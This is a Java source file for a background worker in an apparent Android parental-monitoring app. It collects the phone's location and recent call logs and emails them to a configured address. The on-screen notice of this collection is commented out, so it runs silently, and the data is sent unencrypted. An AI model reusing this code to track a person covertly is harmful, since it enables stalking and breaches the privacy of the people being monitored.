package com.example.familyagent;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.os.Build;
import android.provider.CallLog;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;

import java.io.IOException;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class SynchronousWork extends Worker {
    static final String EMAIL = "email_address";
    static final String TAG = "WorkManager";
    private static final String CHANNEL_ID = "com.saiful.parentalmonitor.MUSIC_CHANNEL_ID";
    private FusedLocationProviderClient fusedLocationClient;
    private Context mContext;

    @SuppressLint("MissingPermission")
    public SynchronousWork(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        mContext = context;
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(context);

    }

    @SuppressLint("MissingPermission")
    @NonNull
    @Override
    public Result doWork() {
        String email = getInputData().getString(EMAIL);
        Log.d(TAG, getId().toString());
        fusedLocationClient.getLastLocation()
                .addOnSuccessListener(location -> {
                    // Got last known location. In some rare situations this can be null.

                    StringBuilder stringBuilder = new StringBuilder();
                    stringBuilder.append("LAST LOCATION:\n");

                    if (location != null) {
                        // Logic to handle location object
                        try {
                            Log.d("Last Location:", getAddress(location.getLatitude(), location.getLongitude()));
                            stringBuilder.append(getAddress(location.getLatitude(), location.getLongitude()));
                            sendMessageWhenLocationIsKnown(email, stringBuilder);
                        } catch (Exception e) {
                            e.printStackTrace();
                            sendMessageWhenLocationIsUnknown(email, stringBuilder);
                        }
                    } else {
                        sendMessageWhenLocationIsUnknown(email, stringBuilder);
                    }
                    Log.d(TAG, "Location is null.");
                })
                .addOnFailureListener(e -> {
                    Log.d(TAG, "Failed to add location service update");
                });
        Log.d(TAG, "Call Logs:\n" + getCallDetails(mContext));
        //createNotificationChannel();
        //showANotification();
        return Result.success();
    }

    private void showANotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(mContext, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_stat_ac_unit)
                .setContentTitle("Monitoring call logs and location")
                .setContentText("Collecting and sending call logs and location")
                .setStyle(new NotificationCompat.BigTextStyle()
                        .bigText("Collecting and sending call logs and location"))
                .setPriority(NotificationCompat.PRIORITY_DEFAULT);

        Notification build = builder.build();
        NotificationManager mNotificationManager =
                (NotificationManager) mContext.getSystemService(Context.NOTIFICATION_SERVICE);
        mNotificationManager.notify(456, build);
    }

    private void sendMessageWhenLocationIsUnknown(String email, StringBuilder stringBuilder) {
        stringBuilder.append("[UNKNWON. May be GPS turned OFF]\n");
        addCallLogs(stringBuilder);
        sendToServer(email, stringBuilder);
    }

    private void sendMessageWhenLocationIsKnown(String email, StringBuilder stringBuilder) {
        addCallLogs(stringBuilder);
        sendToServer(email, stringBuilder);
    }

    private void addCallLogs(StringBuilder stringBuilder) {
        stringBuilder.append("\nCALL LOGS:\n");
        stringBuilder.append(getCallDetails(mContext));
    }

    private void sendToServer(String email, StringBuilder stringBuilder) {
        ServerCommunicator serverCommunicator = new ServerCommunicator();
        //String encryptedMessage = encryptMessageBody(stringBuilder.toString());
        //Log.d(TAG, "Encrypted Text> "+encryptedMessage);
        serverCommunicator.sendEmail(email, "Family Agent [Update]", stringBuilder.toString());
    }

    private void createNotificationChannel() {
        // Create the NotificationChannel, but only on API 26+ because
        // the NotificationChannel class is new and not in the support library
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = mContext.getResources().getString(R.string.channel_name);
            String description = mContext.getResources().getString(R.string.channel_description);
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);
            // Register the channel with the system; you can't change the importance
            // or other notification behaviors after this
            NotificationManager notificationManager = mContext.getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }

    private String getAddress(double latitude, double longitude) {
        StringBuilder result = new StringBuilder();
        try {
            Date currentTime = Calendar.getInstance().getTime();
            Geocoder geocoder = new Geocoder(mContext, Locale.getDefault());
            List<Address> addresses = geocoder.getFromLocation(latitude, longitude, 1);
            if (addresses.size() > 0) {
                Address address = addresses.get(0);
                result.append("\nAddress: ");
                result.append(address.getAddressLine(0)).append("\n");
                result.append("Geo Location (lat, lon): ");
                result.append(latitude);
                result.append(" , ");
                result.append(longitude).append("\nAt: ");
                result.append(currentTime.toString());
            }
        } catch (IOException e) {
            Log.e("tag", e.getMessage());
            result.append("[UNKNWON. May be GPS turned OFF]\n");
        }

        return result.toString();
    }

    private String getCallDetails(Context context) {
        int count = 0;
        final int MAX_CALL_LOGS = 50;
        StringBuilder stringBuffer = new StringBuilder();
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        if (cursor != null) {

            int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = cursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);

            while (cursor.moveToNext() && count <= MAX_CALL_LOGS) {
                String phNumber = cursor.getString(number);
                String callType = cursor.getString(type);
                String callDate = cursor.getString(date);
                Date callDayTime = new Date(Long.valueOf(callDate));
                String callDuration = cursor.getString(duration);
                String dir = null;
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                        + dir + " \nCall Date:--- " + callDayTime
                        + " \nCall duration in sec :--- " + callDuration);
                stringBuffer.append("\n----------------------------------");

                ++count;
            }
            cursor.close();
            return stringBuffer.toString();
        }
        return "";
    }

    private String encryptMessageBody(String plainText){
        MCrypt mcrypt = new MCrypt();

        /* Encrypt */
        try {
            return MCrypt.bytesToHex( mcrypt.encrypt(plainText) );
        } catch (Exception e) {
            e.printStackTrace();
            return "Encryption got failed.";
        }
    }
}


